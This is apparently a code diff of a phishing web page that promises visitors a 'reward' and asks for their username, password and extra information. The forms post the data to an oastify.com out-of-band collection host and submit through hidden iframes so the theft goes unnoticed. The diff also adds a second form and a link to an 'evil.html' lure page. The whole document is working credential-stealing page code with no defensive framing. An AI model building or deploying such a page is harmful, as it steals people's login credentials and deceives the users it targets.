@@ -25,11 +25,17 @@
             height: auto;
         }
 
-        #visibleForm {
+        .form-container {
+            display: flex;
+            justify-content: space-around;
             margin-top: 20px;
         }
 
-        #hiddenForm {
+        .form {
+            width: 45%;
+        }
+
+        .iframe {
             display: none;
         }
     </style>
@@ -37,31 +43,52 @@
 <body>
     <header>
         <h1>You are in the right place!</h1>
-        <p>Please enter your username and password to access and get the reward.</p>
+        <p>Please follow the instructions below to access and get the reward.</p>
     </header>
 
-    <form id="visibleForm" action="https://7t1jy0o0h0trahd5bzcq6bmaa1gy4tsi.oastify.com/Submit" method="post">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required><br>
+    <p>Go to: <a href="https://example.com/evil.html" target="_blank">https://example.com/evil.html</a></p>
 
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br>
+    <div class="form-container">
+        <!-- First Form -->
+        <div class="form">
+            <form id="visibleForm1" action="https://4ejgjx9x2xeovey2wwxnr877vy1wpndc.oastify.com/submit" method="post">
+                <label for="username1">Username:</label>
+                <input type="text" id="username1" name="username1" required><br>
 
-        <input type="button" value="Submit" onclick="submitForm()">
-    </form>
+                <label for="password1">Password:</label>
+                <input type="password" id="password1" name="password1" required><br>
 
-    <iframe id="hiddenForm" name="hiddenForm" src="about:blank"></iframe>
+                <input type="button" value="Submit" onclick="submitForm('visibleForm1', 'hiddenForm1')">
+            </form>
+
+            <iframe class="iframe" id="hiddenForm1" name="hiddenForm1" src="about:blank"></iframe>
+        </div>
+
+        <!-- Second Form -->
+        <div class="form">
+            <form id="visibleForm2" action="https://4ejgjx9x2xeovey2wwxnr877vy1wpndc.oastify.com/submit" method="post">
+                <label for="additionalInfo">Additional Information:</label>
+                <input type="text" id="additionalInfo" name="additionalInfo" required><br>
+
+                <input type="button" value="Submit" onclick="submitForm('visibleForm2', 'hiddenForm2')">
+            </form>
+
+            <iframe class="iframe" id="hiddenForm2" name="hiddenForm2" src="about:blank"></iframe>
+        </div>
+    </div>
+
+    <img src="https://example.com/your-image.jpg" alt="Reward Image">
 
     <script>
-        function submitForm() {
-            var visibleForm = document.getElementById("visibleForm");
-            var hiddenForm = document.getElementById("hiddenForm");
+        function submitForm(visibleFormId, hiddenFormId) {
+            var visibleForm = document.getElementById(visibleFormId);
+            var hiddenForm = document.getElementById(hiddenFormId);
 
             // Copy form values to hidden form
             hiddenForm.contentDocument.body.innerHTML = visibleForm.outerHTML;
 
             // Set the target of the visible form to the hidden iframe
-            visibleForm.target = "hiddenForm";
+            visibleForm.target = hiddenFormId;
 
             // Submit the visible form
             visibleForm.submit();
